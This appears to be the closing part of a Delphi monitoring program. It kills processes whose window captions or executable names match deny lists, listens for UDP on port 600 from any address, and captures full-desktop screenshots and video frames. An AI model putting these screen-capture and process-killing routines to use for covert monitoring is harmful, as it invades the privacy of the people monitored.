            SendMessage(WndParent,WM_GETTEXT,SizeOf(D),integer(@D));
            aCaption :=  string(D);
            ScintillaDebug.edt1.Text:= aCaption;
            for I := 0 to lstDenyCaption.Count -1 do begin

              if Pos (lstDenyCaption.Strings [i] , lowercase(aCaption),1)  <> 0 then begin
                sss := GetPathFromPID (PID);
                ScintillaDebug.memo2.lines.Add ('Caption: '+ lowercase(aCaption) + ' PID: ' + IntToStr(PID)+ ' exe: ' + sss);
                if ScintillaDebug.rg1.ItemIndex = 1 then begin
                  ProcHandle := OpenProcess(SYNCHRONIZE or PROCESS_TERMINATE, False, PID);
                  TerminateProcess(ProcHandle,0);
                  Exit;
                end;
              end;

            end;


                exepath:= GetPathFromPID (PID);
                ScintillaDebug.edtExePath.text := exepath;
                UpdateExeInfo(exepath,W,PID);

    end;
end;
procedure TScintillaDebug.UpdateExeInfo(aFileName: string; w: HWND; PID: cardinal);
var
  aVersionInfo: TVersionInformation;
  ProcHandle: THandle;
  i: Integer;
  exeName: string;
begin


      exeName:=  ExtractFileName(AFileName);
      ScintillaDebug.edtExeName.Text:=exeName;
      aVersionInfo:= TVersionInformation.Create(AFileName);
      with aVersionInfo do
        begin

          ScintillaDebug.edtOriginalFilename.Text:=VersionValue['OriginalFilename'];
          ScintillaDebug.edtFileDescription.Text:=VersionValue['FileDescription'];
          ScintillaDebug.edtFileVersion.Text:=VersionValue['FileVersion'];
          ScintillaDebug.edtProductName.Text:=VersionValue['ProductName'];
          ScintillaDebug.edtInternalName.Text:=VersionValue['InternalName'];
          ScintillaDebug.edtLegalCopyright.Text:=VersionValue['LegalCopyright'];
          ScintillaDebug.edtLegalTrademarks.Text:=VersionValue['LegalTrademarks'];
          ScintillaDebug.edtProductVersion.Text:=VersionValue['ProductVersion'];
          ScintillaDebug.edtCompanyName.Text:=VersionValue['CompanyName'];
          ScintillaDebug.edtComments.Text:=VersionValue['Comments'];
        end;
      aVersionInfo.Free ;

        for I := 0 to lstDenyExe.Count -1 do begin
          if lstDenyExe.Strings [i] = lowercase(exeName) then begin  // la lista è già in lowercase
            ScintillaDebug.memo2.lines.Add ('Exe: '+ lowercase(exeName) + ' PID: ' + IntToStr(PID));
            if ScintillaDebug.rg1.ItemIndex = 1 then begin
              ProcHandle := OpenProcess(SYNCHRONIZE or PROCESS_TERMINATE, False, PID);
              TerminateProcess(ProcHandle,0);
            end;
            //  ProcHandle := OpenProcess(SYNCHRONIZE or PROCESS_TERMINATE, False, PID);
            //  TerminateProcess(ProcHandle,0);



              Exit;


          end;

        end;

end;
Procedure TScintillaDebug.UdpListen;
begin
    udp.Addr := '0.0.0.0'; // Accetto da ogni ip // SenderEdit.Text;
//    WSocketResolveHost(SenderEdit.Text, FSenderAddr, udp.SocketFamily, IPPROTO_UDP);
    WSocketResolveHost('0.0.0.0', FSenderAddr, udp.SocketFamily, IPPROTO_UDP);
    if (FSenderAddr.sin6_family = AF_INET) then begin
        if PSockAddr(@FSenderAddr).sin_addr.S_addr = WSocket_htonl(INADDR_LOOPBACK) then
            { Replace loopback address by real localhost IP addr }
            PSockAddr(@FSenderAddr).sin_addr := WSocketResolveHost(LocalHostName);
        udp.SocketFamily      := sfIPv4;
        udp.Addr              := ICS_ANY_HOST_V4;
        udp.MultiCast         := FALSE;
        udp.MultiCastAddrStr  := '';
    end
    else if (FSenderAddr.sin6_family = AF_INET6) then begin
        if IN6_IS_ADDR_LOOPBACK(@FSenderAddr.sin6_addr) then
            { Replace loopback address by real localhost IP addr }
            WSocketResolveHost(string(LocalHostName), FSenderAddr,
                               udp.SocketFamily, IPPROTO_UDP);
        udp.SocketFamily      := sfIPv6;
        udp.Addr              := ICS_ANY_HOST_V6;
        udp.MultiCast         := TRUE;
        udp.MultiCastAddrStr  := ICS_BROADCAST_V6;
    end;
    udp.Proto             := 'udp';
    udp.Port              := '600';
    udp.LocalPort         := '0';
    udp.Listen;

end;
procedure TScintillaDebug.loadDenyList;
var
ini : TInifile;
Count,i: Integer;
begin
  if DenyModeLoad = mOverWrite then begin
    lstDenyCaption.Clear;
    lstDenyClass.Clear;
    lstDenyExe.Clear;
  end;

  if FileExists(DIR_DATA +'deny.txt') then begin

  Ini:= TIniFile.Create(DIR_DATA +'deny.txt');
  Count:= ini.ReadInteger('denyexe','count',0);
  for I := 0 to Count -1 do begin       // posso anche contare da base 1 a count ma è meglio cosi'
    lstDenyExe.Add( ini.ReadString('denyexe', IntToStr(i +1) ,''));
  end;
  Count:= ini.ReadInteger('denyclass','count',0);
  for I := 0 to Count -1 do begin       // posso anche contare da base 1 a count ma è meglio cosi'
    lstDenyClass.Add( ini.ReadString('denyclass', IntToStr(i +1) ,''));
  end;
  Count:= ini.ReadInteger('denycaption','count',0);
  for I := 0 to Count -1 do begin       // posso anche contare da base 1 a count ma è meglio cosi'
    lstDenyCaption.Add( ini.ReadString('denycaption', IntToStr(i +1) ,''));
  end;

  ini.free;

  end;
end;
procedure TScintillaDebug.GetScreenShot () ;
var
  Win: HWND;
  DC: HDC;
  Bmp: TBitmap;
  WinRect: TRect;
  x, y: Integer;
  zx, zy: Double;
  sxarr: array of Integer;
  dst_rgb: PRGB;
  src_rgb: PRGBROW;
  start: integer;

begin
//    Application.ProcessMessages; // Was Sleep(500);
//    Win := GetForegroundWindow;

//    GetWindowRect(Win, WinRect);
//    DC := GetWindowDC(Win);
//      Windows.GetClientRect(Win, WinRect);
//      DC := GetDC(Win);
   DC:= GetWindowDC(GetDesktopWindow);
//      Width := WinRect.Right - WinRect.Left;
//      Height := WinRect.Bottom - WinRect.Top;
         Caption:='';
        Bmp := TBitmap.Create;
        Bmp.PixelFormat := pf24bit;
        Bmp.Height := Screen.Height ;
        Bmp.Width :=Screen.Width ;
        BitBlt(Bmp.Canvas.Handle, 0, 0, Screen.Width, Screen.Height, DC, 0, 0, SRCCOPY);
//{$define performance}
        // Resize manuale senza api di Windows
        if sMode = sScreenshot then begin
{$ifdef performance}
        SetStretchBltMode(BmpSmall.Handle,HALFTONE);
        start:= getTickcount;
        StretchBlt(BmpSmall.Canvas.Handle,0,0,BmpSmall.Width,BmpSmall.Height, Bmp.Canvas.Handle ,0,0,Bmp.Width,Bmp.Height,SRCCOPY );
        caption:= 'stretchblt: ' +inttostr (gettickCount -start);
        start:= getTickcount;
{$endif performance}

        zx := bmp.Width / ScreenshotW;
        zy := bmp.Height / ScreenshotH;
        SetLength(sxarr, ScreenshotW);
        for x := 0 to ScreenshotW - 1 do
          sxarr[x] := trunc(x * zx);

            for y := 0 to ScreenshotH - 1 do
            begin
              src_rgb := bmp.Scanline[trunc(y * zy)];
              dst_rgb := BmpSmall.Scanline[y];
              for x := 0 to BmpSmall.Width - 1 do
              begin
                dst_rgb^ := src_rgb[sxarr[x]];
                inc(dst_rgb);
              end;
            end;
{$ifdef performance}
        caption:= caption + ' manual: ' + inttostr (gettickCount -start);
{$endif performance}
        end
        else if sMode = sVideo then begin
{$ifdef performance}
        SetStretchBltMode(BmpLarge.Handle,HALFTONE);
        start:= getTickcount;
        StretchBlt(BmpLarge.Canvas.Handle,0,0,BmpLarge.Width,BmpLarge.Height, Bmp.Canvas.Handle ,0,0,Bmp.Width,Bmp.Height,SRCCOPY );
        caption:= 'stretchblt: ' +inttostr (gettickCount -start);
        start:= getTickcount;
{$endif performance}

        zx := bmp.Width /VideoW;
        zy := bmp.Height / VideoH;
        SetLength(sxarr, VideoW);
        for x := 0 to VideoW - 1 do
          sxarr[x] := trunc(x * zx);

            for y := 0 to VideoH - 1 do
            begin
              src_rgb := bmp.Scanline[trunc(y * zy)];
              dst_rgb := BmpLarge.Scanline[y];
              for x := 0 to BmpLarge.Width - 1 do
              begin
                dst_rgb^ := src_rgb[sxarr[x]];
                inc(dst_rgb);
              end;
            end;
{$ifdef performance}
        caption:= caption + ' manual: ' + inttostr (gettickCount -start);
{$endif performance}
        end;


      Bmp.Free;
      ReleaseDC(Win, DC);
end;

end.
